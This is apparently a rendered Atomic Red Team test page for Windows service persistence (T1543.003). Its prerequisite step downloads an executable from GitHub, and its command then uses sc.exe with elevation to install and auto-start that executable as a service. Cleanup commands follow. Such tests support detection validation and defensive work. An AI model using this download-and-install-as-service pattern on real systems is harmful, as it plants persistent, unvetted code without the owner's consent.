---
atomic_guid: "981e2942-e433-44e9-afc1-8c957a1496b6"
title: "Service Installation CMD"
framework: "atomic"
generated: "true"
attack_technique_id: "T1543.003"
attack_technique_name: "Create or Modify System Process: Windows Service"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.yaml"
build_date: "2026-04-26 17:02:13"
executor: "command_prompt"
aliases:
  - "981e2942-e433-44e9-afc1-8c957a1496b6"
  - "Service Installation CMD"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Service Installation CMD

Download an executable from github and start it as a service.
Upon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.

## Metadata

- Atomic GUID: 981e2942-e433-44e9-afc1-8c957a1496b6
- Technique: T1543.003: Create or Modify System Process: Windows Service
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1543.003/T1543.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1543-create_or_modify_system_process|T1543.003]]

## Input Arguments

### binary_path

- description: Name of the service binary, include path.
- type: path
- default: PathToAtomicsFolder\T1543.003\bin\AtomicService.exe

### service_name

- description: Name of the Service
- type: string
- default: AtomicTestService_CMD

### service_type

- description: Type of service. May be own|share|interact|kernel|filesys|rec|userown|usershare
- type: string
- default: Own

### startup_type

- description: Service start method. May be boot|system|auto|demand|disabled|delayed-auto
- type: string
- default: auto

## Dependencies

Service binary must exist on disk at specified location (#{binary_path})

### Prerequisite Check

```powershell
if (Test-Path "#{binary_path}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory (split-path "#{binary_path}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"
```

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
sc.exe create #{service_name} binPath= "#{binary_path}" start=#{startup_type}  type=#{service_type}
sc.exe start #{service_name}
```

### Cleanup

```cmd
sc.exe stop #{service_name} >nul 2>&1
sc.exe delete #{service_name} >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.yaml)
